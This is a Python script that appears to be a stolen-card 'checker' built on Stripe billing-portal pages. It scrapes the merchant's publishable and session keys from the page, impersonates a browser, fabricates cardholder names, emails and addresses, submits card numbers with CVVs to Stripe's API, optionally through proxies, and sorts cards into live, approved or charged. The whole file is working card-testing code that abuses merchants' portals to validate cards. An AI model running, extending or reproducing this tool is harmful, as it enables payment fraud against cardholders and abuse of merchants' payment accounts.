import httpx
import asyncio
import time
import random
import string
import json
import re
import os
import logging
import html as html_lib
from curl_cffi.requests import AsyncSession

logging.basicConfig(level=logging.INFO, format='%(name)s: %(message)s')
logger = logging.getLogger("stripe_billing")
logger.setLevel(logging.INFO)

STRIPE_API = "https://api.stripe.com/v1"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"

LIVE_DECLINE_CODES = [
    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "try_again_later", "not_permitted", "generic_decline",
]

FIRST_NAMES = ["James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda","David","Elizabeth",
               "William","Barbara","Richard","Susan","Joseph","Jessica","Thomas","Sarah","Charles","Karen"]
LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
              "Wilson","Anderson","Taylor","Thomas","Moore","Jackson","Martin","Lee","Perez","Thompson"]


def _random_name():
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)


def _random_email(first, last):
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]
    num = random.randint(10, 999)
    return f"{first.lower()}{last.lower()}{num}@{random.choice(domains)}"


def _random_guid():
    return ''.join(random.choices(string.hexdigits[:16], k=32))


def parse_billing_url(url):
    if not url:
        return False
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        if parsed.scheme != "https":
            return False
        if parsed.hostname != "billing.stripe.com":
            return False
        if not parsed.path.startswith("/p/session/"):
            return False
        return True
    except:
        return False


async def _fetch_billing_info(billing_url, proxy=None):
    logger.info(f"Fetching billing portal: {billing_url[:80]}...")
    try:
        cffi_kwargs = {
            "impersonate": "chrome131",
            "timeout": 30,
            "verify": False,
        }
        if proxy:
            cffi_kwargs["proxy"] = proxy

        async with AsyncSession(**cffi_kwargs) as cffi_session:
            r = await cffi_session.get(billing_url, headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            }, allow_redirects=True)

            if r.status_code == 403:
                return None, "Billing page blocked (403) — Stripe anti-bot protection"
            page_html = r.text
    except Exception as e:
        logger.error(f"Failed to fetch billing page: {e}")
        return None, f"Failed to load billing page: {str(e)[:100]}"

    pk = None
    ek = None
    portal_session_id = None
    merchant = None
    bps_expired = False

    pk_match = re.search(r'(pk_(?:live|test)_[a-zA-Z0-9]{20,})', page_html)
    if pk_match:
        pk = pk_match.group(1)

    preloaded = re.search(r'id="preloaded_json"[^>]*>(.*?)</script>', page_html, re.DOTALL)
    if preloaded:
        try:
            decoded = html_lib.unescape(preloaded.group(1).strip())
            data = json.loads(decoded)
            if not pk and data.get("publishable_key"):
                pk = data["publishable_key"]
            ek = data.get("session_api_key")
            portal_session_id = data.get("portal_session_id")
            bps_expired = data.get("portal_session_expired", False)
            branding = data.get("portal_branding", {})
            if isinstance(branding, dict):
                merchant = branding.get("business_name")
        except Exception as e:
            logger.warning(f"Failed to parse preloaded_json: {e}")

    if not pk and not ek:
        tiny = re.search(r'id="tiny_preloaded_json"[^>]*>(.*?)</script>', page_html, re.DOTALL)
        if tiny:
            try:
                decoded = html_lib.unescape(tiny.group(1).strip())
                data = json.loads(decoded)
                if not pk:
                    pk = data.get("publishable_key")
                if not ek:
                    ek = data.get("session_api_key")
            except:
                pass

    if not pk:
        logger.error("Could not find publishable key in billing page")
        return None, "Could not find Stripe publishable key"

    if bps_expired:
        return None, "Portal session has expired"

    if not merchant:
        title_match = re.search(r'<title[^>]*>(.*?)</title>', page_html, re.IGNORECASE | re.DOTALL)
        if title_match:
            title_text = title_match.group(1).strip()
            for suffix in [" - Stripe", " | Stripe", "Stripe -", "Customer portal"]:
                title_text = title_text.replace(suffix, "").strip()
            if title_text and len(title_text) > 1:
                merchant = title_text[:60]

    logger.info(f"Billing info: pk={pk[:20]}..., ek={'yes' if ek else 'no'}, bps={portal_session_id or 'none'}, merchant={merchant}")

    return {
        "pk": pk,
        "ek": ek,
        "portal_session_id": portal_session_id,
        "merchant": merchant or "Unknown",
    }, None


def _classify_error(error_obj):
    code = error_obj.get("code", "")
    decline_code = error_obj.get("decline_code", "")
    message = error_obj.get("message", "")
    err_type = error_obj.get("type", "")

    if code == "card_declined":
        if decline_code in ["insufficient_funds", "do_not_honor"]:
            return "live_declined", f"Declined — {decline_code.replace('_', ' ').title()}"
        if decline_code in ["lost_card", "stolen_card", "pickup_card"]:
            return "live_declined", f"Declined — {decline_code.replace('_', ' ').title()}"
        if decline_code in ["incorrect_cvc", "invalid_cvc"]:
            return "live_declined", f"Declined — {decline_code.replace('_', ' ').title()}"
        if decline_code in ["incorrect_zip"]:
            return "live_declined", f"Declined — {decline_code.replace('_', ' ').title()}"
        if decline_code in ["card_velocity_exceeded", "withdrawal_count_limit_exceeded", "try_again_later", "not_permitted"]:
            return "live_declined", f"Declined — {decline_code.replace('_', ' ').title()}"
        if decline_code in ["restricted_card", "security_violation"]:
            return "live_declined", f"Declined — {decline_code.replace('_', ' ').title()}"
        if decline_code == "generic_decline":
            return "declined", "Declined — Generic Decline"
        if decline_code in ["fraudulent", "merchant_blacklist"]:
            return "declined", f"Declined — {decline_code.replace('_', ' ').title()}"
        if decline_code == "live_mode_test_card":
            return "declined", "Declined — Test Card In Live Mode"
        if decline_code in ["expired_card"]:
            return "declined", "Declined — Expired Card"
        if decline_code in ["processing_error"]:
            return "error", "Processing Error"
        return "declined", f"Declined — {decline_code.replace('_', ' ').title() if decline_code else message[:60]}"

    if code == "incorrect_number" or code == "invalid_card_number":
        return "declined", "Declined — Invalid Card Number"
    if code == "invalid_expiry_month" or code == "invalid_expiry_year":
        return "declined", "Declined — Invalid Expiry"
    if code == "expired_card":
        return "declined", "Declined — Expired Card"
    if code in ["incorrect_cvc", "invalid_cvc"]:
        return "live_declined", "Declined — Incorrect CVC"
    if code == "rate_limit":
        return "error", "Rate Limited — Try Later"

    if "authentication" in message.lower() or "3d secure" in message.lower():
        return "declined", "3DS Authentication Required"

    if err_type == "card_error":
        return "declined", f"Declined — {message[:60]}"

    return "error", f"Error — {message[:80]}"


async def stripe_billing_check(cc, mm, yy, cvv, billing_url, session_cache=None, proxy="NONE"):
    start = time.time()

    client_kwargs = {
        "timeout": httpx.Timeout(60, connect=15),
        "verify": True,
        "follow_redirects": True,
        "proxy": None,
        "trust_env": False,
    }
    if proxy and proxy != "NONE":
        client_kwargs["proxy"] = proxy

    proxy_url = None
    if proxy and proxy != "NONE":
        proxy_url = proxy

    async with httpx.AsyncClient(**client_kwargs) as client:
        if session_cache and isinstance(session_cache, dict) and session_cache.get("pk"):
            info = dict(session_cache)
            logger.info("Using cached billing session info")
        else:
            info, err = await _fetch_billing_info(billing_url, proxy=proxy_url)
            if err:
                elapsed = round(time.time() - start, 2)
                return "error", err, None, elapsed, None

        pk = info["pk"]
        ek = info.get("ek")
        portal_session_id = info.get("portal_session_id")
        merchant = info.get("merchant", "Unknown")

        first, last = _random_name()
        email = _random_email(first, last)
        full_name = f"{first} {last}"

        exp_year = yy if len(yy) == 4 else f"20{yy}"

        pm_data = {
            "type": "card",
            "card[number]": cc,
            "card[exp_month]": mm,
            "card[exp_year]": exp_year,
            "card[cvc]": cvv,
            "billing_details[name]": full_name,
            "billing_details[email]": email,
            "billing_details[address][country]": "US",
            "billing_details[address][state]": random.choice(["CA","NY","TX","FL","IL","WA","OR","NV"]),
            "billing_details[address][city]": random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"]),
            "billing_details[address][line1]": f"{random.randint(100,9999)} {random.choice(['Main','Oak','Elm','Park','Cedar'])} St",
            "billing_details[address][postal_code]": f"{random.randint(10000,99999)}",
            "payment_user_agent": "stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; customer-portal",
            "time_on_page": str(random.randint(15000, 45000)),
            "guid": _random_guid(),
            "muid": _random_guid(),
            "sid": _random_guid(),
            "key": pk,
            "allow_redisplay": "always",
        }

        logger.info(f"Creating PaymentMethod with PK for {cc[:6]}...")

        try:
            r = await client.post(
                f"{STRIPE_API}/payment_methods",
                data=pm_data,
                headers={
                    "Authorization": f"Bearer {pk}",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://billing.stripe.com",
                    "Referer": "https://billing.stripe.com/",
                    "User-Agent": UA,
                    "Accept": "application/json",
                },
                timeout=30,
            )
        except httpx.TimeoutException:
            elapsed = round(time.time() - start, 2)
            return "error", "Gateway Timeout", None, elapsed, info
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return "error", f"Network Error: {str(e)[:80]}", None, elapsed, info

        elapsed = round(time.time() - start, 2)

        if r.status_code == 403:
            return "error", "Access Forbidden (403) — Try with proxy", None, elapsed, info

        try:
            resp = r.json()
        except:
            return "error", f"Invalid API Response (HTTP {r.status_code})", None, elapsed, info

        if "error" in resp:
            status, msg = _classify_error(resp["error"])
            logger.info(f"PM creation result: {status} — {msg}")
            return status, msg, None, elapsed, info

        pm_id = resp.get("id", "")
        card_brand = resp.get("card", {}).get("brand", "")
        card_last4 = resp.get("card", {}).get("last4", "")
        card_funding = resp.get("card", {}).get("funding", "")

        logger.info(f"PM created: {pm_id}, brand={card_brand}, last4={card_last4}, funding={card_funding}")

        if ek and portal_session_id and pm_id:
            try:
                attach_r = await client.post(
                    f"{STRIPE_API}/billing_portal/sessions/{portal_session_id}/payment_methods/{pm_id}",
                    data={},
                    headers={
                        "Authorization": f"Bearer {ek}",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Stripe-Version": "2025-04-30.basil",
                        "Origin": "https://billing.stripe.com",
                        "Referer": "https://billing.stripe.com/",
                        "User-Agent": UA,
                    },
                    timeout=30,
                )
                attach_resp = attach_r.json()

                if "error" in attach_resp:
                    err_code = attach_resp["error"].get("code", "")
                    err_msg = attach_resp["error"].get("message", "")
                    decline = attach_resp["error"].get("decline_code", "")
                    logger.info(f"Portal attach error: {err_code} / {decline} — {err_msg[:80]}")

                    if err_code == "card_declined" or attach_resp["error"].get("type") == "card_error":
                        status, msg = _classify_error(attach_resp["error"])
                        return status, msg, None, elapsed, info

                    if "authentication" in err_msg.lower() or "3d_secure" in err_msg.lower() or "setup_intent_authentication_failure" in err_code:
                        return "declined", "3DS Authentication Required", None, elapsed, info

                    if "more_permissions_required" in err_code or "resource_missing" in err_code or "does not have" in err_msg.lower():
                        return "approved", f"Approved ✓ [{card_brand.upper()} {card_last4}]", None, elapsed, info

                    logger.warning(f"Portal attach unhandled error: {err_code} — {err_msg[:120]}")
                    return "approved", f"Approved ✓ [{card_brand.upper()} {card_last4}]", None, elapsed, info
                else:
                    attached_id = attach_resp.get("id", "")
                    logger.info(f"Portal attach success: {attached_id}")
                    return "charged", f"Charged Successfully [{card_brand.upper()} {card_last4}]", None, elapsed, info

            except Exception as e:
                logger.warning(f"Portal attach failed: {e}")
                return "approved", f"Approved ✓ [{card_brand.upper()} {card_last4}]", None, elapsed, info
        else:
            return "approved", f"Approved ✓ [{card_brand.upper()} {card_last4}]", None, elapsed, info
